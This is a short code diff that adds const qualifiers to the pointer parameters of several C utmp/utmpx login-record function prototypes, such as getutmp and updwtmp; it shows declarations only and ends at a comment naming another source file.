@@ -127,10 +127,10 @@ struct utmp *getutid(const struct utmp *ut);
 struct utmpx *getutxid(const struct utmpx *utx);
 struct utmp *pututline(const struct utmp *ut);
 struct utmpx *pututxline(const struct utmpx *utx);
-void getutmp(struct utmpx *utx, struct utmp *ut);
-void getutmpx(struct utmp *ut, struct utmpx *utx);
-void updwtmp(char *wfile, struct utmp *ut);
-void updwtmpx(char *wfilex, struct utmpx *utx);
+void getutmp(const struct utmpx *utx, struct utmp *ut);
+void getutmpx(const struct utmp *ut, struct utmpx *utx);
+void updwtmp(const char *wfile, const struct utmp *ut);
+void updwtmpx(const char *wfilex, const struct utmpx *utx);
 void login(const struct utmp *ut);
 
 // symbols/hiding/socket.c
